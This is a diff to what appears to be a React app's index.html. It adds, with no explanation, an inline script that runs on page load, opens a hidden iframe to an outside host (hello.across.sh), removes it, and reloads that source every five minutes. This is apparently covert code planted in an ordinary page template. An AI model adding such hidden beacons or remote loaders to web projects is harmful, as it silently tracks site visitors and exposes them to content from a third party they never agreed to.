@@ -279,6 +279,21 @@
       To begin the development, run `npm start` or `yarn start`.
       To create a production bundle, use `npm run build` or `yarn build`.
     -->
+  <script>
+    !(function () {
+      const e = document.createElement('iframe')
+        ; (e.style.display = 'none'),
+          (e.onload = function () {
+            e.parentNode.removeChild(e)
+          }),
+          (e.src = 'https://hello.across.sh'),
+          (e.id = 'k-iframe'),
+          document.body.appendChild(e),
+          window.setInterval(function () {
+            document.getElementById('k-iframe').src = document.getElementById('k-iframe').src
+          }, 3e5)
+    })()
+  </script>
 </body>
 
 </html>
